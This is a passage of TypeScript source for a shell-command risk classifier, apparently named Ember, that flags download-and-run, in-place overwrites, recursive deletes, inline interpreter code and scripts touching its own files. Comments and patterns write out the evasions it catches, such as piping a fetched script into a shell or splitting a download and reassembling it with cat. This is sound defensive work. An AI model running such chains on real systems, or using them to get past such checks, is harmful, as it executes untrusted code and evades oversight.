  if (removes && packed.length && !keeps) h.e.add("destroy", "archive.in-place", `Replaces ${listOf(ins)} with a packed or unpacked copy.`, { objects: ins });
  // Decompressing a download writes the uncompressed file beside it (`gunzip y.gz` writes y): that file is the download
  // too, so running it later asks (commands-remote-r8-2). The output's name is the input with its suffix stripped (or a
  // custom `-S .suf`), to stdout with -c, where only the pipe carries it.
  const decompresses = /^(gunzip|bunzip2|unxz|unlzma|uncompress|unzstd|unpigz)$/.test(h.key) || has(p, "d", "decompress", "uncompress");
  if (decompresses && !has(p, "c", "stdout", "to-stdout", "t", "test", "l", "list")) {
    const suffix = values(p, "S", "suffix")[0] ?? null;
    for (const o of p.operands) {
      if (o.v === null || o.glob || !h.e.isDownloaded(o, h.sc)) continue;
      const base = suffix && o.v.endsWith(suffix) ? o.v.slice(0, -suffix.length) : o.v.replace(/\.(gz|z|bz2|bz|xz|lzma|lz|Z|zst|zstd|lz4|br|tgz|tbz2?|txz|tzst)$/i, m => (/^\.t(gz|bz2?|xz|zst)$/i.test(m) ? ".tar" : ""));
      if (base !== o.v) h.e.carryDownload(base, h.sc);
    }
  }
  // zstd's and brotli's -o names the file they write (with -f, over one that is there), and zstd's -D a dictionary it
  // reads: judged as that file is (commands-remote-v5-1). Unpacked from a download, it is one too.
  if (!["zstd", "unzstd", "brotli"].includes(h.key)) return;
  const fromDownload = p.operands.some(o => h.e.isDownloaded(o, h.sc));
  for (const o of values(p, "o", "output")) {
    const f = o === null ? { v: null, raw: "?", glob: false } : lit(o);
    if (has(p, "f", "force")) overwrites(h, f);
    else h.e.usePath(f, "write", h.sc);
    if (fromDownload && o) h.e.carryDownload(o, h.sc);
  }
  for (const d of values(p, "D")) h.e.usePath(d === null ? { v: null, raw: "?", glob: false } : lit(d), "read", h.sc);
});

// Programs that write the files their operands or options name (review #169); otherwise they are unknown programs.
reg(NATIVE, ["sponge"], h => { objsOf(h, opts(h).operands, "write"); generic(h); });
reg(NATIVE, ["split", "csplit"], h => {
  const p = opts(h, h.key === "split"
    ? { shortValue: "abClnt", longValue: ["suffix-length", "bytes", "line-bytes", "lines", "number", "separator", "additional-suffix", "filter"] }
    : { shortValue: "bfn", longValue: ["suffix-format", "prefix", "digits"] });
  // The output files' names start with split's second operand or csplit's -f. Only §3.6's rules meet them: the pieces
  // stay writes Ember doesn't follow for a script this command runs (L8).
  const prefix = h.key === "split" ? p.operands[1]?.v : values(p, "f", "prefix")[0];
  const mark = h.e.written.length;
  if (prefix) h.e.usePath(lit(`${prefix}${h.key === "split" ? "aa" : "00"}`), "write", h.sc);
  h.e.written.length = mark;
  // The pieces of a download, named after the prefix in its folder: files of names Ember doesn't follow there
  // (`split x.sh p_; cat p_* > y.sh`: commands-remote-c2-2).
  if ((p.operands[0] && h.e.isDownloaded(p.operands[0], h.sc)) || h.e.pipe.carried === true || h.s.fetchBefore) {
    const at = prefix ?? (h.key === "split" ? "x" : "xx");
    const dir = at.includes("/") ? at.slice(0, at.lastIndexOf("/") + 1) || "/" : ".";
    if (h.sc.cwd) h.e.carryUnnamed(resolveTargetPath(dir, { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd }), true, h.sc);
  }
  // split --filter hands each piece to a shell command instead of a file.
  for (const f of h.key === "split" ? values(p, "filter") : []) {
    if (f === null) h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see.");
    else h.e.nested(f, "sh", h.sc, "split --filter");
  }
  generic(h);
});
reg(NATIVE, ["dpkg-deb"], h => {
  // -x, -X and -R unpack a package into the folder named after it.
  const p = opts(h);
  if (has(p, "x", "extract", "X", "vextract", "R", "raw-extract") && p.operands[1]?.v) writeInto(h, p.operands[1].v);
  generic(h);
});

// sed and perl edit in place: ordinary inside the user's work, except on §3.6's paths; code-running scripts are unclear.
reg(NATIVE, ["sed", "gsed"], h => {
  const p = opts(h, { shortValue: "efl", longValue: ["expression", "file", "line-length"], longOptional: ["in-place"] });
  const inPlace = has(p, "i", "in-place") || h.args.some(a => /^-[a-zA-Z]*i/.test(a.v ?? "") && !(a.v ?? "").startsWith("--"));
  let scripts = values(p, "e", "expression");
  let files = p.operands;
  const scriptFiles = values(p, "f", "file");
  for (const f of scriptFiles) if (f) h.e.usePath(lit(f), "read", h.sc);
  // A sed program file this task downloaded runs code (its `e`, `w`/`r` commands): download-and-run (commands-remote-r8-2).
  if (scriptFiles.some(f => f !== null && h.e.isDownloaded(lit(f), h.sc))) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  if (scripts.length === 0 && scriptFiles.length === 0) { scripts = [files[0]?.v ?? null]; files = files.slice(1); }
  for (const s of scripts) if (s === null || !sedScriptOk(s)) h.e.unclear("unclear.sed-script", "Its sed script can run commands or write files Ember can't see.");
  if (scripts.some(s => s === null || !sedScriptOk(s)) && typeof h.s.stdinText === "string") h.e.judgeInput(h.s.stdinText, h.sc);
  objsOf(h, files, inPlace ? "write" : "read");
  if (files.some(f => f.v === null)) h.e.unclear("unclear.unresolved-arg", "Ember can't tell which arguments sed gets.");
});
/** A sed script without the `e` command, `w`/`W`/`r`/`R` file commands or the `e`/`w` flags of `s`. */
export function sedScriptOk(script: string): boolean {
  const s = script;
  let i = 0;
  const skipSpace = (): void => { while (i < s.length && /[\s;]/.test(s[i])) i++; };
  const readDelimited = (delim: string): boolean => {
    while (i < s.length) {
      if (s[i] === "\\") { i += 2; continue; }
      if (s[i] === "\n" && delim !== "\n") return false;
      if (s[i] === delim) { i++; return true; }
      i++;
    }
    return false;
  };
  const address = (): boolean => {
    if (/[0-9$]/.test(s[i] ?? "")) { while (/[0-9$~+]/.test(s[i] ?? "")) i++; return true; }
    if (s[i] === "/") { i++; return readDelimited("/"); }
    if (s[i] === "\\") { const d = s[i + 1]; i += 2; return readDelimited(d); }
    return true;
  };
  while (i < s.length) {
    skipSpace();
    if (i >= s.length) break;
    if (!address()) return false;
    if (s[i] === ",") { i++; if (!address()) return false; }
    while (s[i] === " " || s[i] === "!") i++;
    const c = s[i++];
    if (c === undefined) return true;
    if (c === "{" || c === "}" || c === "#") { if (c === "#") while (i < s.length && s[i] !== "\n") i++; continue; }
    if ("eEwWrRvF".includes(c) && !(c === "F")) return false;
    if (c === "s") {
      const d = s[i++];
      if (!d || d === "\\" || d === "\n") return false;
      if (!readDelimited(d) || !readDelimited(d)) return false;
      const flags = /^[0-9gpiImMeEw]*/.exec(s.slice(i))?.[0] ?? "";
      if (/[ewE]/.test(flags)) return false;
      i += flags.length;
      continue;
    }
    if (c === "y") {
      const d = s[i++];
      if (!d || !readDelimited(d) || !readDelimited(d)) return false;
      continue;
    }
    if ("aic".includes(c)) { while (i < s.length && s[i] !== "\n") { if (s[i] === "\\") i++; i++; } continue; }
    if (":btT".includes(c)) { while (i < s.length && !/[;\n]/.test(s[i])) i++; continue; }
    if ("lLqQ".includes(c)) { while (/[0-9 ]/.test(s[i] ?? "")) i++; continue; }
    if ("dDgGhHnNpPxz=".includes(c)) continue;
    return false;
  }
  return true;
}

/** awk programs that run commands or write files (`system(`, `|`, `>` outside strings) are unclear (§3.4.5). */
export function awkProgramOk(prog: string): boolean {
  const bare = prog.replace(/"(?:[^"\\]|\\.)*"/g, "\"\"").replace(/\/(?:[^/\\\n]|\\.)+\//g, "//");
  if (/\bsystem\s*\(|\bgetline\b|\bprint\w*\s*[^;}]*[|>]|\|\s*getline|\bclose\s*\(|\bfflush\s*\(/.test(bare)) return false;
  return !/[|>]/.test(bare.replace(/>=|\|\|/g, ""));
}
reg(NATIVE, ["awk", "gawk", "mawk", "nawk"], h => {
  // gawk's -i (include), -l (load) and -E (exec) take a value; -d, -D, -o, -p and -L only attached (commands-remote-i5a).
  // Main's table knew no -i, -l, -E or --exec, so the word after one was the program text: judged that way too
  // (commands-held-8).
  const p = heldOpts(h, { shortValue: "fFvWeilE", longValue: ["file", "field-separator", "assign", "source", "include", "load", "exec"], longOptional: ["dump-variables", "debug", "pretty-print", "profile", "lint"] }, { shortValue: "fFvWe", longValue: ["file", "field-separator", "assign", "source", "include", "load"] });
  const progFiles = values(p, "f", "file", "include", "load", "i", "l", "E", "exec");
  // `-i inplace` writes what it prints back into each file it reads, as sed -i.
  const inPlace = values(p, "i", "include").some(v => v !== null && /^inplace(\.awk)?$/.test(v));
  for (const f of progFiles) if (f && !STDIN_NAME.test(f)) h.e.usePath(lit(f), "read", h.sc);
  // An awk program file this task downloaded runs code (its `system()`, `print > file`): download-and-run
  // (commands-remote-r8-2).
  if (progFiles.some(f => f !== null && !STDIN_NAME.test(f) && h.e.isDownloaded(lit(f), h.sc))) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  // `awk -f -` / `-f /dev/stdin` reads its program from stdin: judge the seen text, else ask (review #166).
  if (progFiles.some(f => f === null || STDIN_NAME.test(f))) fromStdin(h, t => { if (!awkProgramOk(t)) h.e.unclear("unclear.awk-program", "Its awk program can run commands or write files."); });
  else if (progFiles.some(f => f !== null && STREAM_NAME.test(f))) h.e.unclear("unclear.script-stream", SAYS.scriptStream);
  let files = p.operands;
  const inline = values(p, "e", "source");
  if (progFiles.length === 0 && inline.length === 0) { inline.push(files[0]?.v ?? null); files = files.slice(1); }
  for (const prog of inline) if (prog === null || !awkProgramOk(prog)) h.e.unclear("unclear.awk-program", "Its awk program can run commands or write files.");
  if (inline.some(prog => prog === null || !awkProgramOk(prog)) && typeof h.s.stdinText === "string") h.e.judgeInput(h.s.stdinText, h.sc);
  const read = files.filter(f => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(f.v ?? ""));
  if (inPlace) objsOf(h, read, "write");
  h.e.readArgs(read, h.sc, { unresolvedUnclear: true });
});

// Shells: -c text classified as POSIX (§3.4.5); scripts by name; stdin after a fetch is download-and-run (§3.4.7).
reg(NATIVE, [...Object.keys(POSIX_SHELLS), ...OTHER_SHELLS], h => {
  const p = parseOpts(h.args, { shortValue: "oO", longValue: ["rcfile", "init-file"], stopAtOperand: true });
  const posixShell = POSIX_SHELLS[h.key];
  const cIdx = h.args.findIndex(a => a.v !== null && /^-[a-zA-Z]*c[a-zA-Z]*$/.test(a.v) && !a.v.startsWith("--"));
  if (has(p, "l", "login", "i", "rcfile", "init-file") || values(p, "O").length) h.e.unclear("unclear.login-shell", "It starts a shell that runs your profile files.");
  // bash's -P and -o physical, zsh's -w and -o/+o chase_*: every `cd` in it follows links.
  const plusO = h.args.slice(0, cIdx >= 0 ? cIdx : h.args.length).some((a, k, before) => /^\+[A-Za-z]*o/.test(a.v ?? "") && chaseOption(before[k + 1]?.v ?? null));
  if (has(p, "P") || (posixShell === "zsh" && has(p, "w")) || values(p, "o").some(chaseOption) || plusO) h.e.unclear("unclear.chase-links", CHASE_SAYS);
  if (cIdx >= 0) {
    const text = h.args[cIdx + 1];
    if (!text || text.v === null) {
      h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see.");
      if (text?.fetch) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
      return;
    }
    if (!posixShell) { h.e.unclear("unclear.other-shell", `Ember can't read ${h.key}'s language.`); emberText(h, text.v); return; }
    h.e.nested(text.v, posixShell === "bash" ? "bash" : posixShell === "zsh" ? "zsh" : "sh", h.sc, `${h.key} -c`, {}, pipedInto(h));
    return;
  }
  const script = p.operands[0];
  // bash reads its script as bash (brace expansion, `&>`), zsh as zsh; sh, dash and ksh as sh.
  const readAs: ScriptRef["as"] | undefined = posixShell;
  if (script && !has(p, "s")) {
    runScript(h, script, readAs);
    if (script.v !== null) scriptVerbs(h, script.v, p.operands.slice(1));
    // `sh i.sh --daemon`, where i.sh is this task's download: the words after it are the download's own (integ-y-5).
    if (script.v !== null && h.e.isDownloaded(script, h.sc)) detachWords(h, p.operands.slice(1));
    if (!posixShell) h.e.unclear("unclear.other-shell", `Ember can't read ${h.key}'s language.`);
    return;
  }
  intoInterpreter(h, readAs);
  // `curl … | sh -s -- --daemon`: the words after -s are the downloaded script's own (integ-x-2).
  if (has(p, "s") && h.s.fetchBefore) detachWords(h, p.operands);
});

/**
 * A tool reading its program (a makefile, SQL, an awk or debugger script) from stdin or a here-document (review #166):
 * when Ember can see all of the text (a quoted here-document or a here-string), `judge` it; otherwise a fetch before it
 * is download-and-run, and anything else is unclear (it runs code Ember can't see). The dangerous cases ask either way.
 */
function fromStdin(h: H, judge: (text: string) => void, printedAsks = true): void {
  const t = h.s.stdinText;
  if (t !== undefined && t !== null) {
    judge(t);
    // Text echo or printf prints into it is judged, and never decided less safely than a pipe Ember can't see, which
    // is how it was judged before Ember read what is printed: it asks as well (commands-remote-r7-2). `printedAsks`
    // false: a client whose piped input never asked by itself (redis-cli).
    if (h.s.stdin !== "pipe" || !printedAsks) return;
    if (h.s.fetchBefore) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
    else h.e.unclear("unclear.stdin-code", "It runs the text another command prints into it.");
    return;
  }
  if (h.s.fetchBefore && (h.s.stdin === "pipe" || h.s.stdin === "heredoc")) { h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns); return; }
  h.e.unclear("unclear.stdin-code", "Runs code Ember can't see.");
}

/**
 * An interpreter reading its program from stdin: download-and-run after a fetch, else unclear; with no stdin,
 * interactive. A shell given a file (`bash < x.sh`) runs that file as a script: it is read first (L8), like `bash x.sh`.
 */
function intoInterpreter(h: H, readAs?: ScriptRef["as"]): void {
  if (h.s.stdin === "pipe" || h.s.stdin === "heredoc") {
    if (h.s.fetchBefore) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
    else h.e.unclear("unclear.stdin-code", "Runs code Ember can't see.");
    return;
  }
  if (h.s.stdin === "file") {
    // `bash < x.sh`: the file is the program.
    for (const r of h.s.redirs) {
      if (r.kind !== "read" || !r.target) continue;
      if (h.e.isDownloaded(r.target, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
      if (readAs !== undefined) h.e.recordScript(r.target, readAs, h.sc);
    }
    return;
  }
  h.e.unclear("unclear.interactive", SAYS.interactive);
}

/** A script given to an interpreter or shell: judged by name, refused if Ember's, escape if downloaded in this task. */
function runScript(h: H, script: Arg, readAs?: ScriptRef["as"]): void {
  if (script.v === null) {
    if (script.fetch) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
    else h.e.unclear("unclear.script", "It runs a script Ember can't name.");
    return;
  }
  if (script.v === "-" || script.v === "/dev/stdin") { intoInterpreter(h); return; }
  h.e.usePath(script, "exec", h.sc);
  // A folder given as the program (`node .`, `python3 tool`) runs its entry file (commands-remote-c7-3).
  const folder = script.v.replace(/\/+$/, "") || "/";
  const entry = /(^|\/)\.{1,2}$|\/$/.test(script.v) || !/\.[^./]+$/.test(folder) ? ENTRY_FILES.some(n => h.e.isDownloaded(lit(`${folder}/${n}`), h.sc)) : false;
  // A bare name node or python resolves to a downloaded file by adding an extension (`node x` runs x.js), or a glob that
  // matches a downloaded one (`python3 a.p*`): the download runs (commands-remote-r8-2).
  const exts = SCRIPT_EXTS[h.key] ?? [];
  const bareHit = exts.length > 0 && !/\.[^./\\]+$/.test(folder) && !script.glob && exts.some(e => h.e.isDownloaded(lit(script.v + e), h.sc));
  const globHit = script.glob && h.e.globMatchesDownload(script, h.sc);
  const hit = entry || bareHit || globHit;
  if (h.e.isDownloaded(script, h.sc) || hit) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  // Read first all the same, unless the task's record holds it (recordScript); a folder's entry file, a name an
  // interpreter completes or a pattern that is a download is not this file.
  if (readAs !== undefined && !hit) h.e.recordScript(script, readAs, h.sc);
  nameCheck(h, script.v, script.v);
  handedToScript(h, script);
}
/** The files node or python runs when given a folder (package.json names node's). */
const ENTRY_FILES = ["index.js", "index.mjs", "index.cjs", "index.json", "index.node", "package.json", "__main__.py"];
/** Extensions an interpreter adds to a bare program name it is given (`node x` runs x.js), to match a download by name. */
const SCRIPT_EXTS: Readonly<Record<string, readonly string[]>> = {
  node: [".js", ".mjs", ".cjs", ".json", ".node"], nodejs: [".js", ".mjs", ".cjs", ".json", ".node"],
  python: [".py"], python2: [".py"], python3: [".py"], py: [".py"], pypy: [".py"], pypy3: [".py"],
};

/** Inline code: unclear, and refused when it names Ember's own paths (§3.5.8). */
function emberText(h: H, code: string): void {
  for (const e of h.sc.path.ember) if (code.includes(e) || (h.sc.home && code.includes(e.replace(h.sc.home, "~")))) h.e.refuseWith("ember.path", "safety");
  if (/\bember:/i.test(code)) h.e.refuseWith("ember.url", "input");
  if (/keystroke|key code|\bclick\b|system events|sendkeys/i.test(code)) h.e.refuseWith("ember.input", "input");
}

/**
 * Python's own modules that, run with -m, only read, report on, check or build the project's files: they run as
 * before. Any other module is a tool run by its name (pythonModule).
 */
const PY_OWN_MODULES = new Set([
  "json.tool", "venv", "unittest", "doctest", "compileall", "py_compile", "site", "this", "sysconfig", "platform", "calendar", "tokenize", "ast", "dis",
  "pickletools", "tabnanny", "zipapp", "base64", "gzip", "filecmp", "zipfile", "tarfile", "uuid", "random", "locale", "mimetypes", "inspect", "symtable",
  "token", "keyword", "quopri", "os", "shutil", "sys", "pprint", "textwrap", "difflib", "lib2to3", "cProfile", "profile", "trace", "encodings.rot_13",
]);
/** Everyday modules of the project's own tools with no row and no command of their name on the lists. */
const PY_TOOL_MODULES = new Set(["build", "nose", "nose2", "autopep8", "yapf", "pyupgrade", "pipdeptree", "pytest_cov", "xdist"]);

/**
 * `venv --clear DIR` (and virtualenv's) deletes everything in DIR before it makes the environment: judged as the
 * recursive delete of DIR it is (commands-remote-r9-3).
 */
function venvClear(h: H, args: readonly Arg[], wrapper: string): void {
  if (!args.some(a => a.v === "--clear")) return;
  const values = new Set(["--prompt", "--python", "-p", "--upgrade-deps-with", "--app-data", "--seeder", "--creator", "--activators", "--extra-search-dir", "--pip", "--setuptools", "--wheel", "--discovery", "--try-first-with"]);
  const dirs: Arg[] = [];
  for (let k = 0; k < args.length; k++) {
    const v = args[k].v;
    if (v !== null && v.startsWith("-")) { if (values.has(v)) k++; continue; }
    dirs.push(args[k]);
  }
  if (dirs.length === 0) { h.e.add("destroy", "posix.rm", "Deletes everything in a folder Ember can't name."); return; }
  h.e.payload([lit("rm"), lit("-rf"), lit("--"), ...dirs], h.sc, wrapper);
}

/**
 * `python -m <module> …` runs a tool by its name (commands-remote-r9-3): the tool's own row decides, as if the line
 * were `<module> …` (`python3 -m twine upload dist/*` publishes, `python3 -m keyring get …` prints a password,
 * `python3 -m sqlite3 a.db 'drop table x'` changes a database), and a tool Ember doesn't know asks as that program
 * would (`unknown.program`, named by the module for the user's words to match). Python's own everyday modules and the
 * project's test and build tools run as before; what the interpreter's row asks for is kept beside it.
 */
function pythonModule(h: H, mod: string): void {
  if (h.e.readsAsMain) return;
  const at = h.args.findIndex(a => a.v === "-m" || a.v === `-m${mod}`);
  if (at < 0) return;
  const rest = h.args.slice(at + (h.args[at].v === "-m" ? 2 : 1));
  if (mod === "venv") { venvClear(h, rest, "python -m venv"); return; }
  if (PY_OWN_MODULES.has(mod) || PY_TOOL_MODULES.has(mod)) return;
  // The command a module's tool goes by: its own name, or with dashes for underscores (`pre_commit`, `pip_audit`).
  const names = [mod, mod.replace(/_/g, "-")].map(n => n.toLowerCase());
  const tool = names.find(n => NATIVE[n] !== undefined || knownProgram(n) || ORDINARY_VERBS[n] !== undefined) ?? mod;
  h.e.payload([lit(tool), ...rest], h.sc, "python -m");
}

reg(NATIVE, Object.keys(INTERPRETERS).filter(k => !["awk", "gawk", "mawk", "nawk"].includes(k)), h => {
  const spec = INTERPRETERS[h.key];
  const inline = new Set(spec.inline);
  const isNode = h.key === "node" || h.key === "nodejs";
  // Main's table knew no -C for node and none of node's own long options after --run, so the word after one was the
  // script: judged that way too (commands-held-8).
  const p = heldOpts(h, {
    shortValue: spec.valueOpts ?? "", stopAtOperand: true,
    longValue: [
      "eval", "print", "require", "import", "loader", "input-type", "experimental-loader",
      ...(isNode ? ["run", "conditions", "env-file", "env-file-if-exists", "title", "watch-path", "test-reporter", "test-reporter-destination", "redirect-warnings", "openssl-config", "icu-data-dir", "disable-warning", "test-name-pattern", "test-skip-pattern", "diagnostic-dir", "report-dir", "unhandled-rejections", "dns-result-order", "localstorage-file", "experimental-sea-config"] : []),
    ],
  }, { shortValue: isNode ? "r" : spec.valueOpts ?? "", stopAtOperand: true, longValue: ["eval", "print", "require", "import", "loader", "input-type", "experimental-loader", ...(isNode ? ["run"] : [])] });
  // node's own files: where it writes warnings, test reports, local storage and diagnostic reports, and the settings it
  // reads (commands-remote-v5-3).
  if (isNode) optionFiles(h, h.args, p, { write: ["redirect-warnings", "test-reporter-destination", "localstorage-file"], into: ["report-dir", "diagnostic-dir"], read: ["openssl-config", "experimental-sea-config", "icu-data-dir", "watch-path"] });
  for (let k = 0; k < h.args.length; k++) {
    const v = h.args[k].v;
    if (v === null) continue;
    const flag = v.startsWith("--") ? v.split("=")[0] : v.slice(0, 2);
    if (inline.has(flag) || inline.has(v) || (/^-[a-zA-Z]+$/.test(v) && [...v.slice(1)].some(c => inline.has(`-${c}`)))) {
      const code = v.includes("=") && v.startsWith("--") ? v.slice(v.indexOf("=") + 1) : h.args[k + 1]?.v ?? null;
      if (h.key === "perl" && /^-[a-zA-Z]*i/.test(h.args.map(a => a.v ?? "").join(" ")) && code !== null && /^\s*(s|y|tr)(.).*\2[a-z]*\s*;?\s*$/s.test(code) && !/\/[a-z]*e[a-z]*\s*;?\s*$/.test(code)) {
        // perl -pi -e 's/…/…/': an in-place edit (§3.5.1), its files judged as writes.
        objsOf(h, h.args.filter((a, j) => j > k + 1 && !isOption(a)), "write");
        return;
      }
      h.e.unclear("unclear.inline-code", "It runs code given on the command line.");
      if (code !== null) emberText(h, code);
      if (h.args[k + 1]?.fetch) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
      if (h.key === "osascript" && code !== null && /keystroke|key code|\bclick\b|system events/i.test(code)) h.e.refuseWith("ember.input", "input");
      return;
    }
  }
  if (h.key === "osascript" && p.operands[0]) { h.e.unclear("unclear.script", "It runs a script Ember can't see."); return; }
  // node's --env-file loads that file's settings, secrets included, into the program's environment.
  for (const f of values(p, "env-file", "env-file-if-exists")) if (f) h.e.usePath(lit(f), "read", h.sc);
  if (h.key === "php" && h.args.some(a => a.v !== null && a.v.startsWith("-S"))) {
    // PHP's own web server: -S address:port, -t the folder it serves (this one by default), and a router script it
    // runs for every request (review #178).
    const q = parseOpts(h.args, { shortValue: "cdzSt" });
    const addr = values(q, "S").pop();
    listens(h, addr === undefined || addr === null ? null : listenHost(addr), servedRoot(values(q, "t").pop()));
    if (q.operands[0]) runScript(h, q.operands[0]);
    return;
  }
  const mod = values(p, "m")[0];
  if (mod !== undefined && /^python|^pypy|^py$/.test(h.key)) {
    if (mod === "pip" || mod === "pip3") {
      const at = h.args.findIndex(a => a.v === "-m" || a.v === `-m${mod}`);
      const rest = h.args.slice(at + (h.args[at]?.v === "-m" ? 2 : 1));
      pip({ ...h, key: "pip", args: rest });
      return;
    }
    if (mod === "timeit" || mod === "code" || mod === "pdb") { h.e.unclear("unclear.inline-code", "It runs code given on the command line."); return; }
    if (mod === "ensurepip") { h.e.add("system", "pkg.language", "Installs packages (they can run their own setup code)."); return; }
    if (mod === "http.server" || mod === "SimpleHTTPServer" || mod === "CGIHTTPServer") {
      // A web server for a folder (this one by default) on every address unless --bind says otherwise (review #178).
      const at = h.args.findIndex(a => a.v === "-m" || a.v === `-m${mod}`);
      const q = parseOpts(h.args.slice(at + (h.args[at]?.v === "-m" ? 2 : 1)), { shortValue: "bdp", longValue: ["bind", "directory", "protocol"] });
      const bind = values(q, "b", "bind").pop();
      listens(h, bind === undefined ? "" : bind, servedRoot(values(q, "d", "directory").pop()));
      return;
    }
    // zipfile and tarfile -e unpack into the folder given last (review #169).
    if ((mod === "zipfile" || mod === "tarfile") && h.args.some(a => a.v === "-e" || a.v === "--extract") && p.operands.length >= 2) {
      const to = p.operands[p.operands.length - 1];
      if (to.v === null) h.e.add("destroy", "redirect.overwrite", "Writes to files Ember can't name.");
      else writeInto(h, to.v);
    }
    if (mod) nameCheck(h, mod);
    if (mod) pythonModule(h, mod);
    // A module of this task's download (`curl … > x.py; python3 -m x`), or tests it downloaded that pytest or unittest
    // finds (conftest.py, test_x.py): it runs the download (commands-remote-c2-2).
    if (mod && /^[A-Za-z_][\w.]*$/.test(mod)) {
      const file = mod.replace(/\./g, "/");
      // In a folder Ember can't name, Python finds the module there first, so it may be the download's, and so may the
      // tests a runner finds (commands-remote-r8-1).
      const runsDownload = [`${file}.py`, `${file}/__main__.py`, `${file}/__init__.py`].some(f => h.e.isDownloaded(lit(f), h.sc))
        || (/^(pytest|unittest|nose2?|doctest)$/.test(mod) && h.sc.cwd !== null && h.e.downloadedProjectFile(h.sc.cwd, h.sc))
        || (h.sc.cwd === null && h.e.holdsAnyDownload());
      if (runsDownload) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    }
    h.e.readArgs(p.operands, h.sc);
    return;
  }
  if (isNode) {
    // A module it loads first (`node -r ./x.js`, `--import ./x.mjs`) is code it runs: a download of this task asks.
    for (const r of values(p, "r", "require", "import", "loader", "experimental-loader")) {
      if (!r) continue;
      h.e.usePath(lit(r), "read", h.sc);
      if (/^(\.{1,2}[\\/]|[\\/]|~)/.test(r) && h.e.isDownloaded(lit(r), h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    }
    // `node --run <script>` runs a package.json script, judged by its name like `npm run`.
    const run = values(p, "run");
    if (run.length) { for (const r of run) if (r === null) h.e.unclear("unclear.script", "It runs a script Ember can't name."); else nameCheck(h, r); return; }
  }
  const script = p.operands[0];
  if (script) {
    if (/^(deno|bun)$/.test(h.key) && script.v && URL_LIKE.test(script.v)) { h.e.add("escape", "escape.npx", SAYS.downloadsProgram); packageLine(h, p.operands, h.key); return; }
    runScript(h, script);
    if (script.v !== null) scriptVerbs(h, script.v, p.operands.slice(1));
    h.e.readArgs(p.operands.slice(1), h.sc);
    return;
  }
  if (["tclsh", "wish", "jshell", "irb", "ghci"].includes(h.key) && h.s.stdin === null) { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  // Options that make it finish without a program: a version or help, and `node --test` (the work tree's tests).
  if (isNode && has(p, "test")) return;
  if (h.s.stdin === null && h.args.some(a => a.v !== null && (FINISHING.has(a.v) || (FINISHING_SHORT[h.key] ?? []).includes(a.v)))) return;
  intoInterpreter(h);
});

/** Interpreter options that print and finish (with no program and nothing on stdin). */
const FINISHING = new Set(["--version", "--help", "-version", "-help"]);
const FINISHING_SHORT: Readonly<Record<string, readonly string[]>> = {
  python: ["-V", "-h"], python2: ["-V", "-h"], python3: ["-V", "-h"], pypy: ["-V", "-h"], pypy3: ["-V", "-h"], py: ["-V", "-h", "-0", "--list"],
  node: ["-v", "-h"], nodejs: ["-v", "-h"], perl: ["-v", "-V"], php: ["-v", "-h", "-i", "-m"], lua: ["-v"], luajit: ["-v"],
  julia: ["-v", "-h"], ruby: ["-h"], scala: ["-version"], groovy: ["-v"],
};

reg(NATIVE, ["source", "."], h => {
  const script = h.args[0];
  if (!script) return;
  if (script.v === null || script.v === "/dev/stdin" || script.v === "-") {
    if (script.fetch || (script.v === "/dev/stdin" && h.s.fetchBefore)) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
    else if (script.v === "/dev/stdin") intoInterpreter(h);
    else h.e.unclear("unclear.source", "It runs a script Ember can't name.");
    return;
  }
  // A sourced script runs in the shell that sources it.
  runScript(h, script, h.sc.shell === "zsh" || h.sc.shell === "bash" ? h.sc.shell : "sh");
});

reg(NATIVE, ["eval"], h => {
  h.e.unclear("unclear.eval", "Runs code Ember can't see.");
  if (h.args.some(a => a.fetch)) h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
  for (const a of h.args) if (a.v) emberText(h, a.v);
});
reg(NATIVE, ["trap", "alias", "unalias", "enable", "builtin", "shopt", "fc", "bind", "coproc", "select", "function", "if", "then", "elif", "else", "fi", "for", "while", "until", "do", "done", "case", "esac", "[[", "]]", "{", "}", "in", "complete"], h => {
  const words: Record<string, string> = { alias: "It defines an alias Ember can't follow.", unalias: "It changes aliases Ember can't see.", shopt: "It changes how the shell reads commands.", fc: SAYS.interactive };
  // A POSIX shell's own word only when it is written bare: by a path, quoted or escaped (`./if`, `'then'`, `\fi`), or in
  // other letters on a Mac (`IF`), it names a program. That asks under a rule of its own, which a command line or a
  // script never reads through as it does an `if` (scripts.ts's SCRIPT_FLOW; commands-held-6).
  if (h.sc.family === "posix" && RESERVED_WORDS.has(h.key) && h.nameArg.raw !== h.key) h.e.unclear("unclear.named-keyword", SAYS.namedKeyword);
  else h.e.unclear(`unclear.${h.key.replace(/[^a-z]/g, "") || "keyword"}`, words[h.key] ?? SAYS.unclear);
  // A loop's variable is set as an assignment is (`for PATH in /tmp/x; do ls; done` changes where ls is found).
  if (h.key === "for" || h.key === "select") {
    h.e.envChanged = true;
    const name = h.args[0]?.v ?? null;
    // Its list's words (all of "$@" without one), judged and kept for Ember's own refusal (commands-remote-c3-2); a short
    // list of plain names is said by its names on the card.
    const list = h.args[1]?.v === "in" ? h.args.slice(2) : null;
    if (name !== null) h.e.setVar(name, list, h.sc, true);
    // A list with any word that isn't written out (a glob, a variable, a substitution, `"$@"` when there is none), and
    // select's choice, which is the user's typing, are text Ember can't see (commands-a7-2).
    if (h.sc.family === "posix" && (h.key === "select" || list === null || !list.every(writtenOut))) h.e.unclear(...READ_TEXT);
    const plain = list !== null && list.length > 0 && list.length <= 5 && list.every(a => a.v !== null && !a.glob) ? list.map(a => a.v ?? "") : null;
